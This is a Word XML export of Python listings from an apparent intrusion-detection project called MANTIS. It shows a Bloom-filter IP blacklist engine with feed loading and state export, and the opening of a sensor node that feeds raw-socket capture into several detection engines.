    <w:p w14:paraId="128D2FC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extend with salted sha1 digests if more than 3 hashes are requested</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D6F12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 = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39127D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while len(out) &lt; self.hash_count:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157833A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salted = hashlib.sha1(s + b"|" + str(i).encode()).hexdigest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6207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out.append(int(salted, 16) % self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC77D9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 += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3628EE01" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B3F7D6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out[:self.hash_count]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBA6E26" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6420753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add(self, item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3D3E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 in self._hashes(item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64837E9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self.bit_array[i] = 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="239BAA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self.items_added += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DBE227" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F7FC44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check(self, item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639A27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 in self._hashes(item):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF299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self.bit_array[i] == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150262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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178E6D3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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E00AFB2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B611B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threat intelligence feed --------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2778376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load_feed(self, path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F20C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"""Load a newline-separated IP blacklist ("threat intelligence feed").</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DC899B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5897F3D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Blank lines and lines beginning with '#' are treated as comments so a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5871AA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feed can be annotated with its provenance. Returns the number of</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA45AC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indicators loaded, or -1 when the file is missing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3BB18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C1660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path or not os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5170EFE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threat intel feed not found: %s" % path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AF53F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-1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05343027" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E27F55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loaded = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFC45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open(path, "r", encoding="utf-8", errors="replace") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7202339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line in f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5982BCC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indicator = line.strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0791786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indicator or indicator.startswith("#"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C5249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continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101A9E6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tolerate "1.2.3.4,comment" and "1.2.3.4 # note" feed styles</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683AFF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indicator = indicator.split(",")[0].split("#")[0].strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A67B80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indicator:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380C7E3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self.add(indicator)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52523C3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loaded += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DC49EB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="190C8A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threat intel: %d indicators loaded from %s (est. FP rate %.4f%%)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112DDB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(loaded, os.path.basename(path),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27443E3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self.false_positive_rate() * 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0013CB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loaded</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12684498" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="451C2A8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false_positive_rate(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649749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"""Measured saturation-based false-positive estimate: (bits_set/m)^k."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE1572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self.size:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D9D45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0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB36DD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fill = sum(self.bit_array) / float(self.size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8983F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fill ** self.hash_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08991AD7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74A757E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saturation(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E378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sum(self.bit_array) / float(self.size) if self.size else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B979851" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01BB67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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8B8C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analyse(self, source_ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8F873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hit = self.check(source_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4642C9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return Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3C1DF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"Blacklisted" if hit else "Unknown",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5749F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confidence=(1.0 - self.false_positive_rate()) if hit else 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBDD83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detail={"ip": source_ip, "indicators": self.items_added,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1C41A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"saturation": round(self.saturation(), 4)},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601023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is_threat=hit,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663C16C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A435738" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7475C14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train(self, samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6484BB0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"""Insert an iterable of indicators (accepts plain IPs or (ip, label))."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5306D2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added = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CF20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sample in samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7026923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isinstance(sample, (list, tuple)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C57A9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len(sample) &gt; 1 and str(sample[1]).lower() in (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFBD3E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"normal", "safe", "benign", "0"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FE47B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continue          # only blacklist the malicious rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1169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sample = sample[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500E29E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self.add(sample)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A69F8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added += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E807C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print("[BF ] %d indicators (saturation %.2f%%, est. FP %.4f%%)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0231A4D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(added, self.saturation() * 100,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458D4D4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self.false_positive_rate() * 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DB7F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{"indicators": added, "saturation": self.saturation(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BA443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"false_positive_rate": self.false_positive_rate()}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD861C0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B2AE62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export_brain(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CD4DF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the bit array is the model; hex-pack it so the JSON stays compact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A352C9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packed = bytes(bytearray(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FC5C3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sum(bit &lt;&lt; (7 - offset) for offset, bit in enumerate(chunk))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106BA9F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chunk in (self.bit_array[i:i + 8]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D65254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 in range(0, self.size, 8))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C54E55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FF044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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F869E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"size": self.size,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6C00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"hash_count": self.hash_count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5612F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"items_added": self.items_added,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D21CC1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"bits": packed.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549F8A1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7805D62" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="628B3CB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import_brain(self, data):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A4F0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isinstance(data, dict) or "bits" not in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA0C04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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFE45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self.size = int(data.get("size", self.size))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAA1AF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self.hash_count = int(data.get("hash_count", self.hash_count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED878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self.items_added = int(data.get("items_added", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719D387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378CEBF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raw = bytes.fromhex(data["bits"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3445A4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ValueError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBBCBB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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35835E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bits = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC1132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byte in raw:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0908B67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offset in range(8):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4C609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bits.append((byte &gt;&gt; (7 - offset)) &amp; 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4321B8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self.bit_array = bits[:self.size]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAEE8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pad if the packed form was shorter than size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7413A75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while len(self.bit_array) &lt; self.size:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3107CA1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self.bit_array.append(0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E0963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State import: Bloom restored %d indicators."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEFAF3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self.items_added)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2221DF1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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087971B2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="360B6D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reset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F724F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self.bit_array = [0] * self.size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5679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self.items_added = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0387BE3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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09982270" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C6DE4DA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EF1419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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586DC86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bf = BloomFilter(size=100, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AEA22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ip in ["192.168.1.100", "10.0.0.5", "172.16.0.1"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="748FF14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bf.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51294B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ip in ["192.168.1.100", "8.8.8.8", "10.0.0.5", "127.0.0.1"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384430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print(ip, "-&gt;", "BLACKLISTED" if bf.check(ip) else "clean")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0FD9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print("saturation=%.2f%% est FP=%.4f%%"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A18A8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(bf.saturation() * 100, bf.false_positive_rate() * 100))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1804C5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="177BD4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snap = bf.export_brain()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04810D6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restored = BloomFilter(size=100, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65ECA0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restored.import_brain(snap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DC1E4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print("round trip ok:", all(restored.check(ip) for ip in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348179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["192.168.1.100", "10.0.0.5", "172.16.0.1"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66212389" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="205D2EA4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Sensor Node</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D30453"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src/sensor_node/sensor.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0759A738" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>412 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1570B24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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F73808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"""MANTIS sensor node: raw capture, engine fan-out, response.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1723EC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BC9DCE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Producer and consumer architecture:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2BED99" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4246C73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sniffer thread   AF_PACKET raw socket -&gt; bounded queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30568C5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analyzer thread  queue -&gt; PacketParser -&gt; 5 engines -&gt; AlertDispatcher</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03538269" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35BEB9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The queue decouples the two so detection work in the analyzer cannot slow the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E24EE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socket drain. On overflow the sniffer drops rather than blocks, so capture rate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F94F6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degrades gracefully instead of stalling the kernel buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B68F744" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64E2D0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Per-packet engines (Bloom reputation, Naive Bayes payload) run on every frame.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C62046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Per-interval engines (Z-Score volume, KNN port spread, K-Means novelty) run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0750402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once per second on aggregated counters, because their features are rates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBA1CD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7AF23E6C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A51A3E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glob</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6909B9B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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3525C7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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055A61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queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7750F2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socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7786DCF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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD75F0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threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60652FB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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E349DB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E9525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sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB99E61" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DFDFB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dashboard_ui.reporting as reporting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A93E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engines.bloom as bloom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDCDBC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engines.kmeans as kmeans</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E75B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engines.knn as knn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BAFDAE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engines.naive_bayes as naive_bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046ECAD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engines.z_score as z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2968163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sensor_node.dispatcher as dispatcher_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1928DE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sensor_node.parser as parser_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE7CA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utils.active_defense as active_defense</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A56A1A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utils.logger as logger_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3884E2A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utils.packet_store as packet_store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF810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utils.pcap as pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338DF9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utils.privacy as privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AF577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from utils.config import CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BAEA8A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02C46B1B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="444D9C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SensorNode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70764B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__init__(self, stats_queue=None, alert_queue=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053878E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brain_file=None, config=None, forward_alerts=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6283FE5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self.config = config or CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC0BB5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self.stats_queue = stats_queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E12A1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self.alert_queue = alert_queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4117A01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self.brain_file = brain_file or self.config.brain_file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4264C0D5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E46939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self.packet_queue = queue.Queue(maxsize=self.config.queue_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64996E2F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D24E8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detection engines (all share the DetectionEngine interface) ----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C05BC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self.stats_engine = z_score.MinimalistStats(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432220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window_size=self.config.zscore_window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3C97E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threshold=self.config.zscore_threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229BA85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min_pps=self.config.ddos_min_pps,</w:t>
      </w:r>
    </w:p>
